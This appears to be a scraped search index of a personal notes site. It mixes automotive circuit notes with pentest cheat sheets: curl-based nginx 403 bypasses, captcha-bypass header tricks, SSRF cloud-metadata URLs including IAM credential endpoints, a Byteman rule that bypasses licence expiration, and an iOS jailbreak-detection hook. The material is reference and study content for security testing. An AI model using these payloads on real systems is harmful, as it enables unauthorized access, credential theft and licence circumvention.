Banana Pro might need a first-setup hardware equipment (display, mouse \u0026amp; kb).\nPreflight Configuration:\nI usually deploy the following config once I\u0026rsquo;m logged in Kali:\n# =\u0026gt; ssh kali@x.x.x.x $ touch .hushlogin # =\u0026gt; remove welcome message $ echo $PS1 # =\u0026gt; (in .bashrc): PS1=\u0026#34;@\\h [\\s] \\w \u0026#34; \u0026#34;@\\h [\\s] \\w \u0026#34; @ kali [-bash] ~ # =\u0026gt; clean term prompt Enabling root account:\nkali@kali:~$ sudo passwd [sudo] password for kali: Enabling root for SSH:\nkali@kali:~$ grep PermitRootLogin /etc/ssh/sshd_config #PermitRootLogin prohibit-password # the setting of \u0026#34;PermitRootLogin without-password\u0026#34;. kali@kali:~$ kali@kali:~$ man sshd_config | grep -C 1 prohibit-password PermitRootLogin Specifies whether root can log in using ssh(1). The argument must be yes, prohibit-password, forced-commands-only, or no. The default is prohibit-password. If this option is set to prohibit-password (or its deprecated alias, without-password), password and keyboard-interactive authentication are disabled for root. kali@kali:~$ kali@kali:~$ sudo systemctl restart ssh Upgrading \u0026amp; Updating the box\nkali@kali:~$ sudo apt update kali@kali:~$ sudo apt full-upgrade -y kali@kali:~$ sudo apt install -y kali-linux-default Other metapacakages: System Packages, DE\u0026rsquo;s, Tools Package, Menu Package\nAdditional info is available on Kali.org website, which includes Kali In The Browser (noVNC), Kali In The Browser (Guacamole).\n",url:"https://duraki.github.io/notes/building-kali-linux-for-banana-pro/"},"https:\/\/duraki.github.io\/notes\/bypass-403-on-nginx\/":{title:"Bypass 403 on nginx",tags:[],content:"Normally a client can\u0026rsquo;t access /admin directory because of front nginx server which returns 403 Forbidden. We can:\n* use `X-Rewrite-Url` or `X-original-url` * back server processes these headers and front server doesn't.  Steps to reproduce:\nnormally\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: login.example.com\u0026#39; $\u0026#39;https://login.example.com/admin/login\u0026#39; 403 Forbidden ... bypass (1)\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: login.example.com\u0026#39; -H $\u0026#39;X-rewrite-url: admin/login\u0026#39; $\u0026#39;https://login.example.com/\u0026#39; 200 OK bypass (2)\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: example.ba\u0026#39; -H $\u0026#39;X-rewrite-url: admin\u0026#39; $\u0026#39;https://example.ba/\u0026#39; 200 OK ",url:"https://duraki.github.io/notes/bypass-403-on-nginx/"},"https:\/\/duraki.github.io\/notes\/byteman\/":{title:"Byteman",tags:[],content:"Introduction Byteman is a bytecode manipulation tool for tweaking and changing Java application at load time and runtime. It work without the needs for recompilation. The modification is purely in memory, via Event Condition Action rule language - based on Java.\nRules Write ECA based rules which you can inject using Byteman directives and command line application.\n# =\u0026gt; trace.btm RULE trace main entry CLASS ^CognitiveApp METHOD main AT ENTRY IF TRUE DO traceln(\u0026#34;Byteman: Application loaded successfully. java.application.main() called.\u0026#34;) ENDRULE Replace the CognitiveApp with any class handling the Main application login. Use JD-GUI to find for main() functions. It\u0026rsquo;s important to leave ^ char because it indicates the regex pattern.\nRegisters The following registers exists:\n RULE, CLASS, METHOD (Description, Classname, Method Name) AT ENTRY, AT EXIT AT EXCEPTION EXIT AT EXCEPTION ENTRY IF TRUE (Run always)  IF counter / 5 == 10   DO (Execute command)  DO incrementCounter(\u0026ldquo;cnt\u0026rdquo;) DO trace(\u0026ldquo;Trace string line\u0026rdquo;) DO traceStack(\u0026ldquo;Trace stack line\u0026rdquo;)   BIND (Read variable)  BIND counter = readCounter(\u0026ldquo;cnt\u0026rdquo;)   ENDRULE (Script end)  Running  Run the Java application either via Command Line or from the *.shortcut Add %JAVABYTE_HOME% environment in Windows/Linux (ie. setx on Windows, or export on Linux) Create a RULE Use bminstall.bat $PID to inject Byteman in the JVM runtime Use bmsubmit.bat ..\\scripts\\trace.btm to register Byteman script Watch application stdout log output and search for traceln tagged calls  # =\u0026gt; WinNT injection example \u0026gt; cd byteman/bin \u0026gt; bminstall.bat $PID \u0026gt; bmsubmit.bat ..\\scripts\\trace.btm Cannot locate byteman JBoss modules plugin jar redefine rule trace main entry Scripts List of scripts and usage on Byteman Scripts. Just for reference.\nReferences  Official JBoss Byteman Programmers Guide Official Script Samples A Byteman Tutorial JUDCon Flavia Race Condition Bytemon Slides Blog - How to use JBoss and Bytemon Hooking into vulnerabilities in Java applications  ",url:"https://duraki.github.io/notes/byteman/"},"https:\/\/duraki.github.io\/notes\/byteman-scripts\/":{title:"Byteman Scripts",tags:[],content:"Simple trace skeleton\nRULE trace CLASS ^App METHOD login AT ENTRY IF true DO System.out.println(\u0026#34; Tracing login stdout\u0026#34;) DO traceln(\u0026#34;Tracing login ended\u0026#34;) ENDRULE Trace application entry\nRULE trace application entry CLASS ^App METHOD main AT ENTRY IF TRUE DO traceln(\u0026#34;BMB java.application.main() called!\u0026#34;) ENDRULE Trace application exit\nRULE trace application exit CLASS ^App METHOD main AT EXIT IF TRUE DO traceln(\u0026#34;BMB java.application exited\u0026#34;) ENDRULE Thread start\nRULE trace thread start CLASS java.lang.Thread METHOD start() IF true DO traceln(\u0026#34;*** BMB start for thread: \u0026#34; + $0.getName()) ENDRULE Trace application login\nRULE trace application login CLASS ^LoginApi METHOD login AT ENTRY IF TRUE DO traceln(\u0026#34;BMB java.application.login() called!\u0026#34;) ENDRULE Trace class create entry\nRULE ClassLoadMonitor trace create CLASS java.lang.ClassLoader METHOD defineClass(String, byte[], int, int, ProtectionDomain) AT EXIT IF TRUE DO traceStack(\u0026#34;*** BMB Called defineClass(\u0026#34; + $1 + \u0026#34;) in thread \u0026#34; + Thread.currentThread().getName() + \u0026#34;\\n\u0026#34;, 10) ENDRULE Early return\nRULE bypass license expiration CLASS ^App METHOD checkForSecurity AT ENTRY DO debug(\u0026#34;returning earlz with bool\u0026#34;); return true ENDRULE Set default TimeZone\n RULE check setDefault CLASS java.util.TimeZone METHOD setDefault(TimeZone) AT ENTRY IF TRUE DO traceStack(\u0026#34;XXX attempting to get change the default timezone \u0026#34;+ \u0026#34;: parameter : \u0026#34; +$1 + \u0026#34; : detail : \u0026#34; + $1.getDisplayName()) ENDRULE ",url:"https://duraki.github.io/notes/byteman-scripts/"},"https:\/\/duraki.github.io\/notes\/canfd-specifications\/":{title:"CANFD Specifications",tags:[],content:" Extended CAN frame. Can send larger payloads. A bit different structure. Using CANEdge2 for testing the CANFD frames.  ",url:"https://duraki.github.io/notes/canfd-specifications/"},"https:\/\/duraki.github.io\/notes\/captcha-bypass-tricks\/":{title:"Captcha Bypass Tricks",tags:[],content:"Header Injection to bypoass Captcha\n1. Response manipulation. 2. Use previously used token. 3. Use any token with same length(+1/-1). 4. Remove the param value or remove the entire parameter. 5. Change method from POST to GET(or PUT) and remove the captcha. 6. Change body to JSON or vice-versa. 7. OCR. 8. Check whether the captcha is in the source code. (Ex: 2+2) 9. Check whether the value of the captcha is in the source code. 10. Use the same captcha value with the different sessionIDs. 11. JSON Body? Combine 6 and 5. 12. Add headers: X-Forwarded-Host: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Client-IP: 127.0.0.1 X-Host: 127.0.0.1 ",url:"https://duraki.github.io/notes/captcha-bypass-tricks/"},"https:\/\/duraki.github.io\/notes\/categories\/":{title:"Categories",tags:[],content:"",url:"https://duraki.github.io/notes/categories/"},"https:\/\/duraki.github.io\/notes\/circuit-basics\/":{title:"Circuit Basics",tags:[],content:"Types of measurements There are basically two types of measurements; the voltage measurement and the current measurement. In addition, there is also the resistance measurement or continuity measurement.\nVoltage measurement With a voltage measurement you can track whether and how far the voltage from the voltage source (usually the battery) is carried to the consumer via the switch and fuse. This is always done parallel to the consumer, unless the circuit diagram gives other options because the lamp z. B. is one-sided to ground (body). Then you can also measure against the body. Also, the consumer does not necessarily have to be connected to ground.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  a) Consumer is connected to Ground  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  b) Consumer is connected to Plus (Positive), and is switched to Ground  If you measure as presented in example (b) above; a diode against the body, you will always measure 12 volts, but diode will not burn.\nCurrent measurement If it is determined during a voltage measurement that the load is \u0026ldquo;live\u0026rdquo;, this still does not mean that it is functional. However, we can check this by measuring the current, by setting the multimeter to measure current and looping the DMM into a live line with both test probes. Again, pay attention to the measuring range and set the DMM to the expected current. If the DMM now shows a current value, we can assume that the load is ok.\nCircuit Diagram Symbols In order to be able to understand a circuit diagram, you have to know a few basic rules and symbols.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Two lines cross here, but there is no electrical connection  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Only through this point (node) is a connection made between the red and the blue line in the circuit diagram  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Two lines cross here, but there is no electrical connection  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Battery  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Resistance (Resistor)  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Lamp  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Connector  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Earth Point (Ground)  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Fuse  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Pointer Instrument  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Switch  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Light-emitting diode (LED)  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Relay  Circuit Component Descriptions Relay A relay is an electromechanical component consisting of a coil (wire wound around a metal core) and a contact spring. If a current (excitation circuit) is sent through the coil, a magnetic force is created which attracts the contact spring. This closes the working circuit. The excitation current is very small, a few milliamps. A significantly higher current and voltage can now be switched via the working contact. You could use it e.g. B. switch a 220 volt lamp with a 4.5 volt battery. Since both circuits (4.5 volts and 220 volts) are galvanically isolated, there is no risk of shock. The second application is that you can switch huge consumer currents with relatively weak switches (miniature button in the control panel controls the air conditioning compressor).\nLight-emitting diode or LED An LED is a colored display. When connecting, you have to pay attention to the polarity, it doesn\u0026rsquo;t light up the wrong way around. The short leg is always connected in the direction of ground. Most of the time, the LED on the side is also somewhat flattened. It may only be operated with a series resistor. If it is operated without a series resistor, it will burn out.\nTroubleshooting Calculation of the series of resistor:\nLED forward voltage:	3 volts (depending on color and manufacturer) LED working current:	20 mA = 0.02 amps (depending on color and manufacturer) Operating voltage:	12 volts 12 - 3 ------- = 450 ohms 0.02 To make sure resistor doesn\u0026rsquo;t burn, we still have to calculate its power:\n(12 - 3) x 0.02 amperes = 0.18 watts Conclusion: A resistor (450 ohms) and 0.25 watts (standard) is completely sufficient.\nHow to: Tracing the Electrical Issues Simple debugging w/ Multimeter:\nLets make an example. Our first attempt consists of a 12V battery, a Fuse F1, a Switch S1, two connectors, and a lamp. The issue we are experiencing is that the lamp does not light up, although the switch is pressed. The circuit we are testing will look something like this:\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Circuit we are testing, alongside the toolset used  We take our multimeter and use the input for voltage measurement. Measuring range 15 volts. We hold the black test tip to ground. With the red test tip we measure both sides of the lamp. The display shows 0V for both measurements.\n This is logical on the right side of the lamp, since this is where we measure mass. However, 12.5 volts should be present on the left side.  We think of the switch S1 as actuated, ie. closed, and current can flow. The cause could be a defective switch, a blown fuse F1 or a dead battery. We measure again with the red test probe directly on the positive pole of the battery and lo and behold, the multimeter shows 12.5 volts.\nNow let\u0026rsquo;s assume that we can\u0026rsquo;t do any more voltage measurements on the fuse. What now? How can we check the fuse? Very simple, we do a resistance measurement of the fuse. To do this, we remove them from the \u0026ldquo;bracket\u0026rdquo; (ie. where fuses sits at).\nWe now switch our multimeter to resistance measurement and hold both test probes together. The meter now reads 0 ohms, which is OK. With this, we have tested the cables and possibly adjusted the multimeter to 0. Now we hold both test probes to the fuse. Here, too, we get almost 0 ohms as a measured value. Hooray, the fuse is ok too. If it were defective, the measuring device would display a value approaching infinity.\nAfter we have reinstalled the fuse, we set the measuring device back to voltage measurement. With the probe we now measure both connections of the switch (input and output). Here, too, we get 12.5 volts as a measured value in both cases. Everything is fine it seems, and yet there is no voltage on the lamp?\nOnly the two connectors and the cable between them remain. Could this be where the error is? So we disconnect both connectors and again make a resistance measurement at the two ends of the cable. The resistance measurement gives a value towards infinity.\nAha! So there is a broken cable and we have found the fault.\nTo be on the safe side, we can still replace the defective cable with our measuring device. We switch the meter to current measurement, measuring range 1 Amp. We hold the black test tip to the one connector that comes from the switch and the red test tip to the other connector that goes to the lamp. The multimeter shows 0.5 amperes and the lamp burns. The cable is thus clearly localized as the source of the error.\n",url:"https://duraki.github.io/notes/circuit-basics/"},"https:\/\/duraki.github.io\/notes\/classical\/":{title:"Classical",tags:[],content:" OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse  ",url:"https://duraki.github.io/notes/classical/"},"https:\/\/duraki.github.io\/notes\/classical-api-abuse\/":{title:"Classical API Abuse",tags:[],content:"API Keys Reuse Use Keyhacks to scan for key leaks.\nAPI Calling Convention Try to hook() on a call or initiate new calls from the handler.\n",url:"https://duraki.github.io/notes/classical-api-abuse/"},"https:\/\/duraki.github.io\/notes\/cloud-metadata\/":{title:"Cloud Metadata",tags:[],content:"AWS # from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories http://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key AWS (dirs ) http://169.254.169.254/ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/public-keys/ Google Cloud # https://cloud.google.com/compute/docs/metadata # - Requires the header \u0026#34;Metadata-Flavor: Google\u0026#34; or \u0026#34;X-Google-Metadata-Request: True\u0026#34; http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id # Google allows recursive pulls http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true Google # Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn) http://metadata.google.internal/computeMetadata/v1beta1/ Digital Ocean # https://developers.digitalocean.com/documentation/metadata/ http://169.254.169.254/metadata/v1.json http://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1/user-data http://169.254.169.254/metadata/v1/hostname http://169.254.169.254/metadata/v1/region http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address Packetcloud https://metadata.packet.net/userdata Azure # Limited, maybe more exist? # https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/ http://169.254.169.254/metadata/v1/maintenance ## Update Apr 2017, Azure has more support; requires the header \u0026#34;Metadata: true\u0026#34; # https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service http://169.254.169.254/metadata/instance?api-version=2017-04-02 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02\u0026amp;format=text OpenStack/RackSpace # (header required? unknown) http://169.254.169.254/openstack HP Helion # (header required? unknown) http://169.254.169.254/2009-04-04/meta-data/ Oracle Cloud http://192.0.0.192/latest/ http://192.0.0.192/latest/user-data/ http://192.0.0.192/latest/meta-data/ http://192.0.0.192/latest/attributes/ Alibaba http://100.100.100.200/latest/meta-data/ http://100.100.100.200/latest/meta-data/instance-id http://100.100.100.200/latest/meta-data/image-id ",url:"https://duraki.github.io/notes/cloud-metadata/"},"https:\/\/duraki.github.io\/notes\/coded-ground-signals\/":{title:"Coded Ground Signals",tags:[],content:"Coded Ground Signals produce a set of High/Low requests, the combination (pattern) which is interpreted by the Control Module, to perform a specific function. Coded Ground Signals are generated through a switch, or a series of switches, signaling the control module requests for operation.\nBelow is an example of Wiper Switch Schematic, presenting a switch-based logic, depending on the pattern (Pin Status), executing different function depending on the Pin values.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Wiper Switch Schematics, Using a Switch combination (pattern) to execute Wiper functions  Typical Application of Coded Ground Signals  Wiper Switch Windows Switch  ",url:"https://duraki.github.io/notes/coded-ground-signals/"},"https:\/\/duraki.github.io\/notes\/cycript\/":{title:"Cycript",tags:[],content:"Tips and Tricks\nGet pasteboard/clipboard items.\n[UIPasteboard generalPasteboard].items Get UI elements dump.\n[[UIApp keyWindow] recursiveDescription] Bypass Jailbreak UIAlertController via Cycript\nfunction bypassJailbreakDetection() { try { var hook = ObjC.classes.Utils[\u0026#39;+ isJailbroken\u0026#39;]; Interceptor.attach(hook.implementation, { onLeave: function(oldValue) { _newValue = ptr(\u0026#34;0x0\u0026#34;) ; oldValue.replace(_newValue); } }); } catch(err) { console.log(\u0026#34;[-] Error: \u0026#34; + err.message); } } \u0026hellip; from Dynamic Analysis and Hacking.\nSyslog Macros\n# =\u0026gt; common.cy @import com.saurik.substrate.MS NSLog_ = dlsym(RTLD_DEFAULT, \u0026#34;NSLog\u0026#34;) NSLog = function() { var types = \u0026#39;v\u0026#39;, args = [], count = arguments.length; for (var i = 0; i != count; ++i) { types += \u0026#39;@\u0026#39;; args.push(arguments[i]); } new Functor(NSLog_, types).apply(null, args); } Load the macro into Cycript:\n$ cycript -p App common.cy $ cycript -p App Read syslog for log lines:\nsocat - UNIX-CONNECT:/var/run/lockdown/syslog.sock watch ",url:"https://duraki.github.io/notes/cycript/"},"https:\/\/duraki.github.io\/notes\/dc-digital-io-stages\/":{title:"DC Digital IO Stages",tags:[],content:"This document presents Input/Output (IO) stages of signals and sensors in DC Digital Voltage.\nTransistor Final Stage Function  Transistor takes on a number of applications that must be understood to effectively analyze a circuit. Transistor during the operation, functions as two parts, much like a relay Both the Relay and the Transistor controls high currents with low current signal  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Functions of Transistors, and Relays are similar, as can be seen above  The transistor consists of three (3) major sections:\n Base Emitter Collector   The Base/Emitter functions as the control circuit, activated by the Control Module, to oversee or control the work. The Collector/Emitter functions as the work side of the circuit, supplying power, or switching to work operation  During the operation, the transistor can either be switched ON momentarily; can be supplied a constant power (+) or ground (-). Additionally, the transistor can also be either modulated, or fowarded to supply a modulated square wave signal.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  I/O both from and to Control Module via Transistor  Modulated, Momentary, Constant B- as Input/Output Lets take an example:\n The input signal of Control Module \u0026ldquo;1\u0026rdquo; is an output signal of Control Module \u0026ldquo;2\u0026rdquo;. Control Module \u0026ldquo;2\u0026rdquo;, through activation of its internal transistor, provides a ground input for Control Module \u0026ldquo;1\u0026rdquo;. The input signal at Control Module \u0026ldquo;1\u0026rdquo; is either a momentary/constant signal (i.e. torque convertor signal from TCM to DME), or a modulated signal (i.e. vehicle speed signal ASC to DME).  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  I/O Stages, as used by Control Module {1, 2}. CM{2} can use, and control Input Signal from CM{1}  Momentary, Constant B+ as Input/Output Signal Lets take an example:\n The input of Control Module \u0026ldquo;2\u0026rdquo; is controlled by Control Module \u0026ldquo;1\u0026rdquo; Control Module \u0026ldquo;2\u0026rdquo; is possible for control through Control Module \u0026ldquo;1\u0026rdquo; through internal activation of the transistor Control Module \u0026ldquo;1\u0026rdquo; provides power for the input circuit of Control Module \u0026ldquo;2\u0026rdquo;  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  I/O Stages, as used by Control Module {1, 2}. CM{1} can use, and control Input Signal from CM{2}  Constant B-/B+ to Energize a Component  Energizing a component means increasing, storing or providing electrical voltage, or current ot a component.\n Constant B- Output function to energize a component. Relay is energized by activation of the transistor inside the module. The transistor provides a ground for the relay coil, related to Control Module.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Energizing a Component, using const. B- signal  Constant B+ Control Module output function to energize a component. Transistor controls output function of the Control Module. Control Module supplies power to the Relay. The relay is activated by the Control Module, through activation of the transistor which provides a ground for the Relay coil.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Energizing a Component, using const. B\u0026#43; signal  Modulated B-/B+ To Operate a Component Modulated B- Output function to operate a component. The idle valve motor is operated by the Control Module through activation of the transistor which provides a ground for the open winding of the valve.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Operate a Component, using const. B- signal  Modulated B+ Output function to operate a component. The motor is controlled by a transistorized function of the Control Module. It provides a modulated voltage, at a specific frequency to the motor. The throttle position is changed by altering the Duty Cycle of the pulses.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Operate a Component, using const. B- signal  ",url:"https://duraki.github.io/notes/dc-digital-io-stages/"},"https:\/\/duraki.github.io\/notes\/dc-digital-sensors\/":{title:"DC Digital Sensors",tags:[],content:" Hall Effect Sensors Magnetoresistive Sensors Designated Value Signals Coded Ground Signals Transistor Signals  ",url:"https://duraki.github.io/notes/dc-digital-sensors/"},"https:\/\/duraki.github.io\/notes\/dc-voltage-signals\/":{title:"DC Voltage Signals",tags:[],content:"Types of DC Voltage Signals Five Types of DC Voltage Signals are used:\n Analog Signals Digital Signals Designated Value Signals Coded Ground Signals Transistor Signals  DC Voltage Signals are based on either 5 Volts or 12 Volts.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  DC Voltage Signals  DC Analog Signals Analog signals transmit information through an electrical circuit by regulating or changing the current or voltage.\nThree (3) sources of analog signals are:\n NTC Sensors - Negative Temperature Coefficient PTC Sensors - Positive Temperature Coefficient Potentiometers  Read more about NTC/PTC Troubleshooting for potential problems in wiring and schema understanding.\nDC Digital Signals Digital Signals transfer information through electrical circuit, by switching the current ON (1) or OFF (0).\nUnlike Analog Signals which uses voltage, a digital signal has only two possible states, control voltage (1) or zero voltage (0).\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  DC Digital Signals  Two (2) types of Digital Signals:\n Switched (High) Signals - B+ Switched (Low) Signals - B- Modulated Square Wave Signals  Designated Value Signals The page has been moved to dedicated page \u0026ldquo;Designated Value Signals\u0026rdquo;, of topic DC Digital Sensors.\nCoded Ground Signals The page has been moved to dedicated page \u0026ldquo;Coded Ground Signals\u0026rdquo;, of topic DC Digital Sensors.\nTransistor Signals The page has been moved to dedicated page \u0026ldquo;Transistor Signals\u0026rdquo;, of topic DC Digital Sensors.\n",url:"https://duraki.github.io/notes/dc-voltage-signals/"},"https:\/\/duraki.github.io\/notes\/decrypt-ipa-from-appstore\/":{title:"Decrypt IPA from AppStore",tags:[],content:"Requires iproxy and frida-ios-dump. File will be generated in current directory with *.ipa extension.\n# =\u0026gt; Start iproxy $ iproxy 2222 22 # =\u0026gt; Lists App from iOS processes $ cd ~/util/re/ios/frida-ios-dump $ python dump.py -l PID Name Identifier --- - App Name Here xxx.xxxxxx.xxxxxx.xx # =\u0026gt; Dump App from iOS device $ ./dump.py xxx.xxxxxx.xxxxxx.xx ... ",url:"https://duraki.github.io/notes/decrypt-ipa-from-appstore/"},"https:\/\/duraki.github.io\/notes\/designated-value-signals\/":{title:"Designated Value Signals",tags:[],content:"Designated Values are produced through fixed resistance positions of a multi-position switch.\nAs the switch is operated, the voltage drop across the resistor(s) of each switch position causes the voltage level of the input signal to change to a predetermined (designated, fixed, constant) voltage value.\nThese predetermined (designated) voltage signals the Control Module to perform specific functions.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Designated Value Signals viewed in Oscilloscope  Below is an example diagram showing a Control Module unit with internal resistor, using Input Signal (predetermined voltage values). In a Switch Function, a constant resistor values are shown, which causes the operation flow to execute depending on the resistance value.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Diagram showing Designed Value Signal switch with predefined Resistor Ohm Values  ",url:"https://duraki.github.io/notes/designated-value-signals/"},"https:\/\/duraki.github.io\/notes\/dev\/":{title:"Dev",tags:[],content:" Bash  ",url:"https://duraki.github.io/notes/dev/"},"https:\/\/duraki.github.io\/notes\/din\/":{title:"DIN",tags:[],content:"There is a terminal designation for almost every connection of a consumer or switch in the vehicle in order to facilitate the connection. The designation of the individual connections is defined in Germany, according to DIN 72552. The table below shows an excerpt of the most important connections from this DIN.\nDIN 72552 is a DIN (Deutsches Institut für Normung) standard for labeling the electric terminals in automotive wiring. Visit this Wikipedia Link to learn more about this standard.\nThe column \u0026ldquo;Contact\u0026rdquo; is refering to a clamp of the connection (consumer), or a switch.\n   Contact Meaning      Ignition system   1 ignition coil, distributor, low voltage   1a, 1b distributor with two separate circuits   2 breaker points magneto ignition   4 coil, distributor, high voltage   4a, 4b distributor with two separate circuits, high voltage   7 terminal on ballast resistor, to distributor   15 battery+ from ignition switch   15a from ballast resistor to coil and starter motor   15e battery+ from ignition switch, also when starter motor runs    Preheat (Diesel engines)   15 preheat in   17 start   19 preheat (glow)    Starter   45 starter relay   45a starter 1 output   45b starter 2 output   50 starter control   50a starter control   50b starter control   50c starter control   50d starter control   50e starter control   50f starter control   50g starter control   50h starter control    Battery   15 battery+ through ignition switch   30 from battery+ direct   30a from 2nd battery and 12/24 V relay   31 return to battery- or direct to ground   31a return to battery- 12/24 V relay   31b return to battery- or ground through switch   31c return to battery- 12/24 V relay    Electric motors   32 return   33 main terminal (swap of 32 and 33 is possible)   33a limit   33b field   33f 2. slow rpm   33g 3. slow rpm   33h 4. slow rpm   33L rotation left   33R rotation right    Indicators   49 flasher unit in   49a flasher unit out, indicator switch in   49b out 2. flasher circuit   49c out 3. flasher circuit   C 1st flasher indicator light   C2 2nd flasher indicator light   C3 3rd flasher indicator light   L indicator lights left   R indicator lights right   L54 lights 